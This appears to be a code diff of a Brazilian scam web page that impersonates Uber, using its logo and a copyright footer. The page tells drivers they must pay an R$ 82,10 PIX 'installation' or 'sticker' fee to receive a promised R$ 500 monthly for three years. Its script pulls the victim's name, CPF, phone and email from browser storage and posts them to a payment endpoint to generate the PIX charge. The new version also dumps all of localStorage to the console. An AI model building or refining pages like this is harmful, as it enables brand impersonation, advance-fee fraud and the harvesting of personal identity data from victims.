@@ -1,413 +1,248 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Taxa de Instalação - Uber</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        /* Reset any inherited styles */
-        button {
-            all: unset;
-            box-sizing: border-box;
-        }
-        
-        /* Force button styles */
-        .calendar-btn {
-            width: 40px !important;
-            height: 40px !important;
-            border: 2px solid #333 !important;
-            background: white !important;
-            color: #333 !important;
-            font-weight: 600 !important;
-            cursor: pointer !important;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1) !important;
-            transition: all 0.2s !important;
-            display: flex !important;
-            align-items: center !important;
-            justify-content: center !important;
-            border-radius: 0px !important;
-        }
-        
-        .calendar-btn:disabled {
-            background: #f3f4f6 !important;
-            color: #9ca3af !important;
-            border-color: #d1d5db !important;
-            cursor: not-allowed !important;
-            box-shadow: none !important;
-        }
-        
-        .calendar-btn.selected {
-            background: #333 !important;
-            color: white !important;
-            transform: translateY(-2px) !important;
-            box-shadow: 0 6px 12px rgba(0,0,0,0.2) !important;
-        }
-        
-        .time-btn-custom {
-            padding: 12px 16px !important;
-            border: 2px solid #333 !important;
-            background: white !important;
-            color: #333 !important;
-            font-weight: 600 !important;
-            cursor: pointer !important;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1) !important;
-            transition: all 0.2s !important;
-            border-radius: 0px !important;
-            text-align: center !important;
-        }
-        
-        .time-btn-custom.selected {
-            background: #333 !important;
-            color: white !important;
-            transform: translateY(-2px) !important;
-            box-shadow: 0 6px 12px rgba(0,0,0,0.2) !important;
-        }
-        
-        .time-btn-custom:hover:not(.selected) {
-            transform: translateY(-2px) !important;
-            box-shadow: 0 6px 12px rgba(0,0,0,0.15) !important;
-        }
-    </style>
-</head>
-<body class="bg-white">
-<div style="min-height: 100vh; background-color: white; padding: 32px 16px;">
-    <div style="max-width: 1024px; margin: 0 auto;">
-        
-        <!-- Header -->
-        <div style="text-align: center; margin-bottom: 48px;">
-            <h1 style="font-size: 28px; font-weight: 700; color: #333333; margin-bottom: 16px;">Taxa de Instalação do Adesivo Uber</h1>
-            <p style="font-size: 16px; color: #dc2626; font-weight: 600;">PAGAMENTO OBRIGATÓRIO</p>
-        </div>
+{% extends "layout.html" %}
 
-        <!-- Important Information -->
-        <div style="margin-bottom: 48px;">
-            <h2 style="font-size: 28px; font-weight: 700; color: #333333; margin-bottom: 24px;">⚠️ Informações Importantes sobre a Instalação</h2>
-            <div style="font-size: 16px; color: #333333;">
-                <p style="margin-bottom: 12px;">• <strong>O adesivo DEVE ser instalado por um funcionário autorizado da Uber</strong></p>
-                <p style="margin-bottom: 12px;">• O funcionário irá instalar o adesivo e tirar foto como comprovação</p>
-                <p style="margin-bottom: 12px;">• <strong>Sem o pagamento desta taxa, você NÃO participará do programa</strong></p>
-                <p style="margin-bottom: 12px;">• <strong>Sem a instalação, você NÃO receberá os R$ 500,00 mensais por 3 anos</strong></p>
-            </div>
-        </div>
+{% block title %}Pagamento do Adesivo Uber{% endblock %}
 
-        <!-- Calendar Section -->
-        <div style="margin-bottom: 48px;">
-            <h2 style="font-size: 28px; font-weight: 700; color: #333333; margin-bottom: 24px;">Agendar Instalação do Adesivo</h2>
-            
-            <div style="margin-bottom: 32px;">
-                <h3 style="font-size: 16px; font-weight: 600; color: #333333; margin-bottom: 16px;">Selecione o Dia:</h3>
-                <div style="background-color: #EEEEEE; padding: 24px; border-radius: 0px;">
-                    <div id="calendar-container" style="display: grid; grid-template-columns: repeat(7, 1fr); gap: 8px; text-align: center;">
-                        <!-- Calendar will be populated by JavaScript -->
-                    </div>
-                </div>
-            </div>
-
-            <div style="margin-bottom: 32px;">
-                <h3 style="font-size: 16px; font-weight: 600; color: #333333; margin-bottom: 16px;">Selecione o Horário:</h3>
-                <div style="background-color: #EEEEEE; padding: 24px; border-radius: 0px;">
-                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px;">
-                        <button class="time-btn-custom" data-time="07:00 - 09:00">07:00 - 09:00</button>
-                        <button class="time-btn-custom" data-time="09:00 - 11:00">09:00 - 11:00</button>
-                        <button class="time-btn-custom" data-time="11:00 - 13:00">11:00 - 13:00</button>
-                        <button class="time-btn-custom" data-time="13:00 - 15:00">13:00 - 15:00</button>
-                        <button class="time-btn-custom" data-time="15:00 - 17:00">15:00 - 17:00</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Selected Appointment -->
-            <div id="appointment-display" style="display: none; margin-bottom: 32px;">
-                <h4 style="font-size: 16px; font-weight: 600; color: #059669; margin-bottom: 8px;">Agendamento Selecionado:</h4>
-                <p style="font-size: 16px; color: #333;">
-                    Data: <span id="selected-date"></span><br>
-                    Horário: <span id="selected-time"></span>
-                </p>
-            </div>
-        </div>
-
-        <!-- PIX Section -->
-        <div>
-            <div style="text-align: center; margin-bottom: 32px;">
-                <h2 style="font-size: 28px; font-weight: 700; color: #333333; margin-bottom: 8px;">PIX - R$ 82,10</h2>
-                <p style="font-size: 16px; color: #666;">Taxa de Instalação do Adesivo</p>
-            </div>
-
-            <div id="loading-pix" style="text-align: center; font-size: 16px; color: #666; margin-bottom: 32px;">
-                Carregando dados de pagamento...
-            </div>
-
-            <div style="text-align: center; margin-bottom: 32px;">
-                <img id="qr-code-img" src="" alt="QR Code PIX" style="display: none; width: 192px; height: 192px; border: 1px solid #ddd;">
-            </div>
-
-            <div id="pix-code-section" style="display: none; margin-bottom: 32px;">
-                <label style="font-size: 16px; font-weight: 500; color: #333; margin-bottom: 8px; display: block;">Código PIX (Copia e Cola)</label>
-                <div style="display: flex; gap: 8px;">
-                    <input type="text" id="pix-code-input" readonly style="flex: 1; padding: 8px 12px; border: 1px solid #ccc; font-family: monospace; background: #f9f9f9;">
-                    <button onclick="copyCode()" id="copy-btn" style="padding: 8px 16px; background: #333; color: white; border: none; cursor: pointer;">Copiar</button>
-                </div>
-            </div>
-
+{% block content %}
+<div class="container mx-auto px-4 py-6 max-w-4xl">
+    <!-- Header -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <div class="flex items-center mb-4">
+            <img src="https://i.ibb.co/wFFn5HSn/13093103960002-1.png" alt="Uber" class="h-16 mr-4">
             <div>
-                <h3 style="font-size: 16px; font-weight: 600; color: #333; margin-bottom: 16px;">Como pagar:</h3>
-                <ol style="font-size: 16px; color: #666; padding-left: 20px;">
-                    <li style="margin-bottom: 8px;">Selecione data e horário para instalação acima</li>
-                    <li style="margin-bottom: 8px;">Abra o app do seu banco</li>
-                    <li style="margin-bottom: 8px;">Escolha a opção PIX</li>
-                    <li style="margin-bottom: 8px;">Escaneie o QR Code ou cole o código</li>
-                    <li style="margin-bottom: 8px;">Confirme o pagamento de R$ 82,10</li>
-                    <li style="margin-bottom: 8px;">Aguarde nosso funcionário no dia e horário agendados</li>
-                </ol>
+                <h1 class="text-2xl font-bold text-gray-800">Pagamento do Adesivo</h1>
+                <p class="text-gray-600">Programa Uber - R$ 500,00 Mensais</p>
             </div>
         </div>
-    </main>
+        
+        <div class="bg-black text-white p-4" style="border-radius: 0px !important;">
+            <p class="text-sm text-white">
+                <strong>Adesivo Obrigatório:</strong> Para receber os R$ 500,00 mensais é necessário pagar pelo adesivo Uber personalizado.
+            </p>
+        </div>
+    </div>
 
-    <!-- Footer -->
-    <footer class="bg-black text-white py-12">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
-                <div>
-                    <img src="https://i.ibb.co/wFFn5HSn/13093103960002-1.png" alt="Uber" class="h-8 w-auto mb-4">
-                    <p class="text-gray-400 text-sm">Visite a Central de Ajuda</p>
+    <!-- Adesivo Information -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <h2 class="text-xl font-bold mb-4 text-gray-800">Informações do Adesivo</h2>
+        
+        <div class="space-y-3">
+            <p>Programa: <strong>Uber Partner</strong></p>
+            <p>Benefício Mensal: <strong>R$ 500,00</strong></p>
+            <p>Adesivo Personalizado com entrega via Sedex</p>
+            <p>Instalação obrigatória no veículo</p>
+        </div>
+    </div>
+
+    <!-- Payment Summary -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <h2 class="text-xl font-bold mb-4 text-gray-800">Resumo do Pagamento</h2>
+        
+        <div class="space-y-3">
+            <div class="flex justify-between items-center border-b pb-2">
+                <span class="text-gray-600">Adesivo Uber:</span>
+                <span class="font-medium">R$ 82,10</span>
+            </div>
+            <div class="flex justify-between items-center border-b pb-2">
+                <span class="text-gray-600">Entrega Sedex:</span>
+                <span class="font-medium">Incluído</span>
+            </div>
+            <div class="flex justify-between items-center text-lg font-bold text-black bg-gray-100 p-3" style="border-radius: 0px !important;">
+                <span>Total a Pagar:</span>
+                <span>R$ 82,10</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Warning -->
+    <div class="bg-yellow-50 p-4 mb-6" style="border-radius: 0px !important;">
+        <p class="text-sm text-yellow-700">
+            <strong>Importante:</strong> O adesivo será enviado apenas após confirmação do pagamento via PIX. 
+            O envio será feito em até 24 horas úteis via Sedex para o endereço cadastrado.
+        </p>
+    </div>
+
+    <!-- Payment Section -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <h2 class="text-xl font-bold mb-4 text-gray-800">Pagamento do Adesivo</h2>
+        
+        <div class="text-center">
+            <!-- PIX Information Display -->
+            <div id="pixInfo">
+                <!-- QR Code -->
+                <div class="mb-4">
+                    <img id="pixQrCode" src="" alt="QR Code PIX" class="mx-auto w-64 h-64 border-2 border-gray-300" style="border-radius: 0px !important; display: none;">
                 </div>
-                <div>
-                    <h3 class="text-white font-semibold mb-4">Empresa</h3>
-                    <ul class="space-y-2">
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors text-sm">Sobre nós</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors text-sm">Nossa ofertas</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors text-sm">Como funciona</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors text-sm">Carreiras</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="text-white font-semibold mb-4">Produtos</h3>
-                    <ul class="space-y-2">
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors text-sm">Viajar</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors text-sm">Dirigir</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors text-sm">Uber Eats</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-white transition-colors text-sm">Uber for Business</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="text-white font-semibold mb-4">Siga-nos</h3>
-                    <div class="flex space-x-4">
-                        <a href="#" class="text-gray-400 hover:text-white transition-colors">
-                            <i class="fa fa-facebook"></i>
-                        </a>
-                        <a href="#" class="text-gray-400 hover:text-white transition-colors">
-                            <i class="fa fa-twitter"></i>
-                        </a>
-                        <a href="#" class="text-gray-400 hover:text-white transition-colors">
-                            <i class="fa fa-instagram"></i>
-                        </a>
-                        <a href="#" class="text-gray-400 hover:text-white transition-colors">
-                            <i class="fa fa-linkedin"></i>
-                        </a>
+                
+                <!-- PIX Code -->
+                <div class="mb-4" id="pixCodeSection" style="display: none;">
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Código PIX:</label>
+                    <div class="flex">
+                        <input type="text" id="pixCode" readonly class="flex-1 px-3 py-2 border border-gray-300 text-sm" style="border-radius: 0px !important;">
+                        <button onclick="copyPixCode()" class="bg-green-500 hover:bg-green-600 text-white px-4 py-2 text-sm" style="border-radius: 0px !important;">
+                            Copiar
+                        </button>
                     </div>
                 </div>
-            </div>
-            <div class="border-t border-gray-700 mt-8 pt-8 flex flex-col md:flex-row justify-between items-center">
-                <p class="text-gray-400 text-sm">© 2024 Uber Technologies Inc.</p>
-                <div class="flex space-x-4 mt-4 md:mt-0">
-                    <a href="#" class="text-gray-400 hover:text-white transition-colors text-sm">Privacidade</a>
-                    <a href="#" class="text-gray-400 hover:text-white transition-colors text-sm">Acessibilidade</a>
-                    <a href="#" class="text-gray-400 hover:text-white transition-colors text-sm">Termos</a>
+                
+                <div id="loadingMessage" class="text-gray-600 mb-4">
+                    Carregando dados de pagamento...
                 </div>
             </div>
+            
+            <p class="text-sm text-gray-600">
+                Pagamento seguro processado via For4Payments
+            </p>
         </div>
-    </footer>
-
-    <!-- Scripts -->
-    <script src="/static/js/fix_colors.js"></script>
-    <script src="/static/js/uber-fonts.js"></script>
-
-    <!-- Force Uber Fonts Script -->
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Force Uber fonts on all elements
-            const style = document.createElement('style');
-            style.textContent = `
-                * {
-                    font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
-                }
-                h1, h2, h3, h4, h5, h6 {
-                    font-family: "UberMove", "UberMoveText", Arial, sans-serif !important;
-                }
-            `;
-            document.head.appendChild(style);
-            console.log('UBER FONTS APLICADAS NA PÁGINA /FINALIZAR!');
-        });
-    </script>
+    </div>
+</div>
 
 <script>
-let selectedDate = null;
-let selectedTime = null;
-
-// Generate calendar
-function generateCalendar() {
-    const now = new Date();
-    const year = now.getFullYear();
-    const month = now.getMonth();
-    const today = now.getDate();
-    
-    const monthNames = ['Janeiro', 'Fevereiro', 'Março', 'Abril', 'Maio', 'Junho',
-                       'Julho', 'Agosto', 'Setembro', 'Outubro', 'Novembro', 'Dezembro'];
-    const dayNames = ['Dom', 'Seg', 'Ter', 'Qua', 'Qui', 'Sex', 'Sáb'];
-    
-    const firstDay = new Date(year, month, 1);
-    const lastDay = new Date(year, month + 1, 0);
-    const daysInMonth = lastDay.getDate();
-    const startDay = firstDay.getDay();
-    
-    const container = document.getElementById('calendar-container');
-    container.innerHTML = '';
-    
-    // Month header
-    const monthHeader = document.createElement('div');
-    monthHeader.style.cssText = 'grid-column: 1 / -1; font-size: 16px; font-weight: 600; color: #333; margin-bottom: 16px; text-align: center;';
-    monthHeader.textContent = `${monthNames[month]} ${year}`;
-    container.appendChild(monthHeader);
-    
-    // Day headers
-    dayNames.forEach(day => {
-        const dayHeader = document.createElement('div');
-        dayHeader.style.cssText = 'font-size: 12px; font-weight: 500; color: #666; padding: 8px 0; text-align: center;';
-        dayHeader.textContent = day;
-        container.appendChild(dayHeader);
-    });
-    
-    // Empty days
-    for (let i = 0; i < startDay; i++) {
-        container.appendChild(document.createElement('div'));
-    }
-    
-    // Calendar days
-    for (let day = 1; day <= daysInMonth; day++) {
-        const dayBtn = document.createElement('button');
-        dayBtn.textContent = day;
-        dayBtn.className = 'day-btn';
+// Auto-generate PIX payment on page load
+document.addEventListener('DOMContentLoaded', async function() {
+    try {
+        // Get user data from localStorage - check all possible sources
+        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+        const paymentData = JSON.parse(localStorage.getItem('cnvPaymentData') || '{}');
         
-        dayBtn.className = 'calendar-btn';
+        // Try multiple localStorage keys for user data
+        const userName = (
+            paymentData.name || 
+            userData.full_name || 
+            userData.name || 
+            localStorage.getItem('candidateName') || 
+            localStorage.getItem('userName') || 
+            ''
+        );
         
-        if (day <= today + 3) {
-            dayBtn.disabled = true;
-        } else {
-            dayBtn.onclick = () => selectDate(day, month, year, dayBtn);
+        const userCPF = (
+            paymentData.cpf || 
+            userData.cpf || 
+            localStorage.getItem('candidateCPF') || 
+            localStorage.getItem('userCPF') || 
+            ''
+        );
+        
+        const userPhone = (
+            paymentData.phone || 
+            userData.phone || 
+            localStorage.getItem('candidatePhone') || 
+            localStorage.getItem('userPhone') || 
+            ''
+        );
+        
+        const userEmail = (
+            paymentData.email || 
+            userData.email || 
+            localStorage.getItem('candidateEmail') || 
+            localStorage.getItem('userEmail') || 
+            ''
+        );
+        
+        console.log('Extracted user data:', { name: userName, cpf: userCPF, phone: userPhone, email: userEmail });
+        
+        // Debug localStorage contents
+        console.log('All localStorage keys:', Object.keys(localStorage));
+        for (let key in localStorage) {
+            console.log(`localStorage.${key}:`, localStorage.getItem(key));
         }
         
-        container.appendChild(dayBtn);
-    }
-}
-
-// Select date
-function selectDate(day, month, year, element) {
-    selectedDate = `${day}/${month + 1}/${year}`;
-    
-    document.querySelectorAll('.calendar-btn:not([disabled])').forEach(btn => {
-        btn.classList.remove('selected');
-    });
-    
-    element.classList.add('selected');
-    
-    updateAppointment();
-}
-
-// Setup time selector
-function setupTimeSelector() {
-    document.querySelectorAll('.time-btn-custom').forEach(btn => {
-        btn.onclick = function() {
-            selectedTime = this.dataset.time;
-            
-            document.querySelectorAll('.time-btn-custom').forEach(b => {
-                b.classList.remove('selected');
-            });
-            
-            this.classList.add('selected');
-            
-            updateAppointment();
-        };
-    });
-}
-
-// Update appointment display
-function updateAppointment() {
-    if (selectedDate && selectedTime) {
-        document.getElementById('selected-date').textContent = selectedDate;
-        document.getElementById('selected-time').textContent = selectedTime;
-        document.getElementById('appointment-display').style.display = 'block';
-        
-        localStorage.setItem('selectedAppointment', JSON.stringify({
-            date: selectedDate,
-            time: selectedTime
-        }));
-    }
-}
-
-// Copy PIX code
-function copyCode() {
-    const input = document.getElementById('pix-code-input');
-    input.select();
-    document.execCommand('copy');
-    
-    const btn = document.getElementById('copy-btn');
-    btn.textContent = 'Copiado!';
-    btn.style.background = '#059669';
-}
-
-// Load PIX payment
-async function loadPixPayment() {
-    try {
-        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
-        
-        const userName = userData.full_name || localStorage.getItem('candidateName') || '';
-        const userCPF = userData.cpf || localStorage.getItem('candidateCPF') || '';
-        const userPhone = userData.phone || localStorage.getItem('candidatePhone') || '';
-        const userEmail = userData.email || localStorage.getItem('candidateEmail') || '';
-        
         if (userName && userCPF) {
+            const payloadData = {
+                name: userName,
+                cpf: userCPF,
+                email: userEmail,
+                phone: userPhone
+            };
+            
+            console.log('Sending payload:', payloadData);
+            
+            // Create payment using existing endpoint
             const response = await fetch('/create_cnv_payment', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    name: userName,
-                    cpf: userCPF,
-                    email: userEmail,
-                    phone: userPhone
-                })
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payloadData)
             });
             
             const result = await response.json();
+            console.log('API Response:', result);
             
             if (result.success && result.payment_data) {
                 const pixData = result.payment_data;
+                console.log('PIX Data:', pixData);
                 
+                // Display real PIX code
                 if (pixData.pixCopyPaste) {
-                    document.getElementById('pix-code-input').value = pixData.pixCopyPaste;
-                    document.getElementById('pix-code-section').style.display = 'block';
+                    document.getElementById('pixCode').value = pixData.pixCopyPaste;
+                    document.getElementById('pixCodeSection').style.display = 'block';
+                    console.log('PIX code set successfully');
                 }
                 
+                // Display real QR Code
                 if (pixData.pixQrCode) {
-                    document.getElementById('qr-code-img').src = pixData.pixQrCode;
-                    document.getElementById('qr-code-img').style.display = 'block';
+                    const qrCodeElement = document.getElementById('pixQrCode');
+                    qrCodeElement.src = pixData.pixQrCode;
+                    qrCodeElement.style.display = 'block';
+                    console.log('QR Code displayed successfully');
                 }
                 
-                document.getElementById('loading-pix').style.display = 'none';
+                // Store payment ID for status checking
+                if (pixData.paymentId) {
+                    localStorage.setItem('cnvPaymentId', pixData.paymentId);
+                    console.log('Payment ID stored:', pixData.paymentId);
+                }
+                
+                // Hide loading message
+                document.getElementById('loadingMessage').style.display = 'none';
+                
+            } else {
+                throw new Error(result.error || 'Erro ao criar pagamento PIX');
             }
+        } else {
+            console.error('Dados do usuário incompletos:', { name: userName, cpf: userCPF, phone: userPhone });
+            document.getElementById('loadingMessage').innerHTML = `
+                <div class="text-red-600">
+                    Dados do usuário não encontrados no localStorage.<br>
+                    Nome: ${userName || 'não encontrado'}<br>
+                    CPF: ${userCPF || 'não encontrado'}<br>
+                    <a href="/" class="text-blue-600 underline">Voltar ao início</a>
+                </div>
+            `;
         }
     } catch (error) {
-        document.getElementById('loading-pix').textContent = 'Erro ao carregar pagamento';
+        console.error('Erro ao criar pagamento:', error);
+        document.getElementById('loadingMessage').innerHTML = `
+            <div class="text-red-600">
+                Erro ao carregar dados de pagamento: ${error.message}<br>
+                <a href="/" class="text-blue-600 underline">Voltar ao início</a>
+            </div>
+        `;
+    }
+});
+
+// Copy PIX code function
+function copyPixCode() {
+    const pixCodeInput = document.getElementById('pixCode');
+    pixCodeInput.select();
+    pixCodeInput.setSelectionRange(0, 99999);
+    
+    try {
+        document.execCommand('copy');
+        
+        const button = event.target.closest('button');
+        const originalText = button.textContent;
+        button.textContent = 'Copiado!';
+        button.classList.add('bg-green-600');
+        
+        setTimeout(() => {
+            button.textContent = originalText;
+            button.classList.remove('bg-green-600');
+        }, 2000);
+        
+    } catch (err) {
+        alert('Erro ao copiar código PIX');
     }
 }
-
-// Initialize
-document.addEventListener('DOMContentLoaded', function() {
-    generateCalendar();
-    setupTimeSelector();
-    loadPixPayment();
-});
 </script>
-
-</body>
-</html>
+{% endblock %}
